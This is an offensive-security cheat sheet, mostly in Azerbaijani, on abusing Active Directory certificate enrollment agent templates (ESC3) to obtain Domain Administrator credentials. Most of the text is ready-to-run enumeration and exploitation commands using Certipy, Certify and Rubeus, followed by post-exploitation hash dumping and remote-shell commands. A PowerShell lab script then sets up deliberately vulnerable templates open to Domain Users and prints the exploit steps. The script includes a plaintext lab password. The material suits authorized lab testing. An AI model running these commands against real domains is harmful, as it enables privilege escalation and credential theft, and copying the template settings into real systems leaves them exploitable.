# ESC3 — Certificate Request Agent Abuse

---

## ESC3 Nədir?

ESC3 iki ayrı şablonun birlikdə istifadə edilməsinə əsaslanır:

- **Condition 1** — `Certificate Request Agent` EKU-su olan şablon: hücumçu
  bu şablondan bir *enrollment agent* sertifikatı alır.
- **Condition 2** — `msPKI-RA-Signature >= 1` olan şablon: bu şablon
  enrollment agent sertifikatı ilə başqası adından (on-behalf-of) enroll
  edilməsinə icazə verir.

Hücumçu öz istifadəçi hesabıyla bu iki şablonu ardıcıl istifadə edərək
Domain Admin adına Client Authentication sertifikatı alır.

---

## ESC3 Condition 1 — Enrollment Agent Şablonu

```
EKU                           -    Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
Broad enrollment permit        -    Domain Users, Authenticated Users və ya digər geniş qruplar
Manager approval not required  -    Sertifikat avtomatik verilir
msPKI-RA-Signature             -    0  (enrollment agent sertifikatı tələb olunmur)
```

### Condition 1 Flags

```powershell
pKIExtendedKeyUsage      -    1.3.6.1.4.1.311.20.2.1    # Certificate Request Agent
msPKI-Enrollment-Flag    -    0x0                        # Manager approval yoxdur
msPKI-RA-Signature       -    0
```

---

## ESC3 Condition 2 — On-Behalf-Of Hədəf Şablonu

```
EKU                           -    Client Authentication (1.3.6.1.5.5.7.3.2) və ya Any Purpose
msPKI-RA-Signature             -    >= 1  (enrollment agent sertifikatı tələb edir)
CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF  -  0x800 in msPKI-Enrollment-Flag
Manager approval not required  -    Avtomatik verilir
Broad enrollment permit        -    Domain Users, Authenticated Users və ya digər geniş qruplar
```

### Condition 2 Flags

```powershell
pKIExtendedKeyUsage          -    1.3.6.1.5.5.7.3.2    # Client Authentication
msPKI-RA-Signature           -    1 (və ya daha çox)
msPKI-Enrollment-Flag        -    0x800                 # CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF
```

---

## ESC3 Enumeration

```powershell
# Certipy — hər iki condition-u eyni anda aşkar edir
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

# Certify.exe
Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

---

## ESC3 Enumeration With LDAP

```powershell
# Condition 1 — Certificate Request Agent EKU olan şablonlar
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)" \
  name msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage

# Condition 2 — msPKI-RA-Signature >= 1 olan şablonlar
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(&(objectClass=pKICertificateTemplate)(msPKI-RA-Signature=1))" \
  name msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage
```

---

## ESC3 Exploitation with Certipy

```powershell
# Step 1 — Condition 1 şablonundan Enrollment Agent sertifikatı al
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC3-Cond1' \
    -ldap-scheme ldap

# Output: test.pfx  (enrollment agent sertifikatı)

# Step 2 — Həmin sertifikatı istifadə edərək Domain Admin adına
#           Condition 2 şablonundan sertifikat al
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC3-Cond2' \
    -on-behalf-of 'certificate\administrator' \
    -pfx test.pfx \
    -ldap-scheme ldap

# Output: administrator.pfx

# Step 3 — NT Hash al
certipy-ad auth \
    -pfx administrator.pfx \
    -dc-ip 192.168.0.150

# Step 3 (alternativ) — TGT al
certipy-ad auth \
    -pfx administrator.pfx \
    -domain certificate.local \
    -dc-ip 192.168.0.150
```

---

## ESC3 Exploitation With Certify and Rubeus

```powershell
# Step 1 — Enrollment Agent sertifikatı al (Condition 1)
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnESC3-Cond1"

# Convert PEM → PFX (Linux)
openssl pkcs12 -in agent_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out agent.pfx

# Step 2 — Agent sertifikatı ilə Domain Admin adına enroll et (Condition 2)
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnESC3-Cond2" \
    /onbehalfof:"DOMAIN\administrator" \
    /enrollcert:agent.pfx \
    /enrollcertpwd:''

# Convert PEM → PFX (Linux)
openssl pkcs12 -in admin_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out admin.pfx

# Step 3 — TGT al
Rubeus.exe asktgt /user:administrator \
    /certificate:admin.pfx \
    /password:'' /ptt

# Yoxla
klist
whoami /all
```

---

## Post Exploitation

```powershell
# SMB with NT Hash
impacket-psexec  -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

---

## Laboratory

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC3 Vulnerable Lab Setup Script (Fixed)
    Iki sablon yaradir:
      VulnESC3-Cond1 — Certificate Request Agent EKU (Condition 1)
      VulnESC3-Cond2 — msPKI-RA-Signature=1, Client Auth + RA Policy (Condition 2)

.DESCRIPTION
    ESC3 ucun duzelismis versiya:
      - msPKI-RA-Application-Policies atributu elave edildi (Cond2)
      - msPKI-Certificate-Name-Flag = 1 (Supply in Request) edildi
      - Enrollment icazesi duzgun verilir
      - CA-ya elave ve servisin yeniden basladilmasi daxildir

    Kifayetsiz icaze halinda SYSTEM kimi islet:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC3Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# ── Config ────────────────────────────────────────────────────────────────────

$Cond1Name   = "VulnESC3-Cond1"
$Cond2Name   = "VulnESC3-Cond2"
$Cond1OID    = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.300"
$Cond2OID    = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.301"
$EnrollGroup = "Domain Users"

# ── Helpers ───────────────────────────────────────────────────────────────────

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

function Grant-Enroll {
    param($TemplateName, $TemplatePath, $Group)
    try {
        $sid  = (New-Object System.Security.Principal.NTAccount($Group)).Translate(
                    [System.Security.Principal.SecurityIdentifier])
        $acl  = Get-Acl "AD:\CN=$TemplateName,$TemplatePath"

        # Enroll (ExtendedRight)
        $ruleEnroll = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight",
            [System.Security.AccessControl.AccessControlType]"Allow",
            [guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"   # Enroll GUID
        )
        # Read (GenericRead)
        $ruleRead = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]"GenericRead",
            [System.Security.AccessControl.AccessControlType]"Allow"
        )
        $acl.AddAccessRule($ruleEnroll)
        $acl.AddAccessRule($ruleRead)
        Set-Acl -Path "AD:\CN=$TemplateName,$TemplatePath" -AclObject $acl -ErrorAction Stop
        Write-Ok "Enroll + Read icazesi '$Group' ucun '$TemplateName' sablonuna verildi."
    } catch {
        Write-Fail "'$TemplateName' uzerinde ACL qurmaq olmadi: $_"
        exit 1
    }
}

# ── Preflight ─────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ESC3 Lab Setup (Fixed Edition)" -ForegroundColor Magenta
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Muhit yoxlanilir..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "AD-e catmaq mumkun deyil. Bu bir Domain Controller-dir?"
    exit 1
}

# CA adini avtomatik tap
try {
    $caConfig = (certutil -getconfig 2>$null | Select-String "Config:").ToString().Trim()
    $caName   = ((certutil -dump 2>$null) | Select-String "^`".*`"$" | Select-Object -First 1).ToString().Trim().Trim('"')
    Write-Ok "CA tapildi."
} catch {
    Write-Warn "CA adi avtomatik tapilmadi, devam edilir..."
}

# ── Cleanup existing ──────────────────────────────────────────────────────────

foreach ($name in @($Cond1Name, $Cond2Name)) {
    $existing = Get-ADObject -Filter { Name -eq $name } -SearchBase $templatePath -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Warn "Movcud '$name' sablonu tapildi. Silinir..."
        try {
            certutil -SetCATemplates -$name 2>$null | Out-Null
            Start-Sleep -Seconds 2
            Remove-ADObject "CN=$name,$templatePath" -Confirm:$false -ErrorAction Stop
            Write-Ok "Kohne '$name' sablonu silindi."
        } catch {
            Write-Fail "'$name' silinmedi: $_"
            Write-Warn "SYSTEM kimi islet: PsExec64.exe -s -i powershell.exe .\Setup-ESC3Lab.ps1"
            exit 1
        }
    }
}

# ── Create Condition 1 Template ───────────────────────────────────────────────
# EKU: Certificate Request Agent
# msPKI-RA-Signature = 0  (agent cert teleb etmir)
# msPKI-Certificate-Name-Flag = 1 (Supply in Request — certipy ucun vacibdir)

Write-Step "Condition 1 sablonu yaradilir: $Cond1Name"

$attrsC1 = @{
    "displayName"                          = $Cond1Name
    "msPKI-Cert-Template-OID"              = $Cond1OID
    "msPKI-Certificate-Name-Flag"          = 1           # Supply in Request (FIX #1)
    "msPKI-Enrollment-Flag"                = 0           # Manager tesdiqlemesi yoxdur
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16          # Exportable
    "msPKI-RA-Signature"                   = 0           # Agent cert teleb etmir
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    # Certificate Request Agent EKU
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.4.1.311.20.2.1"
    "pKIExtendedKeyUsage"                  = "1.3.6.1.4.1.311.20.2.1"
    "pKIDefaultKeySpec"                    = 2
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $Cond1Name -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrsC1 -ErrorAction Stop
    Write-Ok "Condition 1 sablonu yaradildi."
} catch {
    Write-Fail "Condition 1 sablonu yaradilmadi: $_"
    exit 1
}

Grant-Enroll -TemplateName $Cond1Name -TemplatePath $templatePath -Group $EnrollGroup

# ── Create Condition 2 Template ───────────────────────────────────────────────
# EKU: Client Authentication
# msPKI-RA-Signature = 1  (agent cert teleb edir)
# msPKI-RA-Application-Policies = Certificate Request Agent (FIX #2)
# CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF = 0x800

Write-Step "Condition 2 sablonu yaradilir: $Cond2Name"

$attrsC2 = @{
    "displayName"                          = $Cond2Name
    "msPKI-Cert-Template-OID"              = $Cond2OID
    "msPKI-Certificate-Name-Flag"          = 1           # Supply in Request (FIX #1)
    "msPKI-Enrollment-Flag"                = 0x800       # CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 16          # Exportable
    "msPKI-RA-Signature"                   = 1           # Agent cert teleb edir
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    # Client Authentication EKU
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"
    # CRITICAL FIX #2: Agent sertifikatin hansı EKU-ya malik olmali oldugunu bildirir
    # Bu olmadan CA agent imzasini verify ede bilmir → TEMPLATE_POLICY_REQUIRED xetasi
    "msPKI-RA-Application-Policies"        = "1.3.6.1.4.1.311.20.2.1"
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
    "flags"                                = 131104
    "revision"                             = 100
}

try {
    New-ADObject -Name $Cond2Name -Path $templatePath -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrsC2 -ErrorAction Stop
    Write-Ok "Condition 2 sablonu yaradildi."
} catch {
    Write-Fail "Condition 2 sablonu yaradilmadi: $_"
    exit 1
}

Grant-Enroll -TemplateName $Cond2Name -TemplatePath $templatePath -Group $EnrollGroup

# ── Add both templates to CA ──────────────────────────────────────────────────

Write-Step "Sablonlar CA-ya elave edilir..."

foreach ($name in @($Cond1Name, $Cond2Name)) {
    $result = certutil -SetCATemplates +$name 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Ok "'$name' CA-ya elave edildi."
    } else {
        Write-Warn "certutil '$name' ucun ugursuz oldu, Add-CATemplate sinaniir..."
        try {
            Add-CATemplate -Name $name -Force -ErrorAction Stop
            Write-Ok "'$name' Add-CATemplate vasitesile elave edildi."
        } catch {
            Write-Fail "'$name' CA-ya elave edilmedi: $_"
            exit 1
        }
    }
}

# ── Verify Templates ──────────────────────────────────────────────────────────

Write-Step "Sablonlar yoxlanilir..."

foreach ($name in @($Cond1Name, $Cond2Name)) {
    $obj = Get-ADObject -Filter { Name -eq $name } -SearchBase $templatePath `
           -Properties "msPKI-RA-Signature","msPKI-Enrollment-Flag",
                       "msPKI-Certificate-Name-Flag","msPKI-RA-Application-Policies",
                       "pKIExtendedKeyUsage" -ErrorAction SilentlyContinue
    if ($obj) {
        Write-Ok "'$name' AD-de tapildi."
    } else {
        Write-Fail "'$name' AD-de tapilmadi!"
    }
}

# ── Restart CertSvc ───────────────────────────────────────────────────────────

Write-Step "CertSvc yeniden basladilir..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 6
$svc = Get-Service CertSvc
if ($svc.Status -eq "Running") {
    Write-Ok "CertSvc isleyir."
} else {
    Write-Fail "CertSvc baslamadi! Manuel yoxlayin: Get-Service CertSvc"
}

# ── Summary ───────────────────────────────────────────────────────────────────

$domain = (Get-ADDomain).DNSRoot
$dcHost = (Get-ADDomainController).HostName
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

# CA adini tap
$caName = (Get-ChildItem "Cert:\LocalMachine\CA" | Where-Object {$_.Subject -match $domain} | Select-Object -First 1).Issuer
if (-not $caName) { $caName = "<CA-NAME>" }

$netbios = (Get-ADDomain).NetBIOSName

Write-Host ""
Write-Host "  ──────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  ESC3 Lab Hazirdir" -ForegroundColor Green
Write-Host "  ──────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Duzeldilen problemler:" -ForegroundColor Yellow
Write-Host "    [1] msPKI-Certificate-Name-Flag = 1  (hər iki şablon)" -ForegroundColor White
Write-Host "    [2] msPKI-RA-Application-Policies əlavə edildi (Cond2)" -ForegroundColor White
Write-Host "    [3] Enroll ACL — ExtendedRight GUID ilə verildi" -ForegroundColor White
Write-Host ""
Write-Host "  Condition 1 Sablonu : $Cond1Name" -ForegroundColor Cyan
Write-Host "    EKU               : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)" -ForegroundColor White
Write-Host "    RA Signature      : 0" -ForegroundColor White
Write-Host "    Name Flag         : 1 (Supply in Request)" -ForegroundColor White
Write-Host ""
Write-Host "  Condition 2 Sablonu : $Cond2Name" -ForegroundColor Cyan
Write-Host "    EKU               : Client Authentication (1.3.6.1.5.5.7.3.2)" -ForegroundColor White
Write-Host "    RA Signature      : 1" -ForegroundColor White
Write-Host "    RA App Policy     : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)" -ForegroundColor White
Write-Host "    Enroll Flag       : CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF (0x800)" -ForegroundColor White
Write-Host ""
Write-Host "  ──────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  Exploit (Kali-den):" -ForegroundColor Yellow
Write-Host ""
Write-Host "  # Step 1 — Enrollment Agent sertifikati al" -ForegroundColor DarkGray
Write-Host "  certipy-ad req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Green
Write-Host "      -dc-ip $dcIP -target $dcHost \`" -ForegroundColor Green
Write-Host "      -ca '<CA-NAME>' -template '$Cond1Name' \`" -ForegroundColor Green
Write-Host "      -upn 'lowuser@$domain'" -ForegroundColor Green
Write-Host "  # Netice: lowuser.pfx" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  # Step 2 — Agent sertifikati ile administrator adina enroll et" -ForegroundColor DarkGray
Write-Host "  certipy-ad req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Green
Write-Host "      -dc-ip $dcIP -target $dcHost \`" -ForegroundColor Green
Write-Host "      -ca '<CA-NAME>' -template '$Cond2Name' \`" -ForegroundColor Green
Write-Host "      -on-behalf-of '$netbios\administrator' \`" -ForegroundColor Green
Write-Host "      -pfx lowuser.pfx" -ForegroundColor Green
Write-Host "  # Netice: administrator.pfx" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  # Step 3 — Authenticate" -ForegroundColor DarkGray
Write-Host "  certipy-ad auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Green
Write-Host ""
Write-Host "  ──────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
```
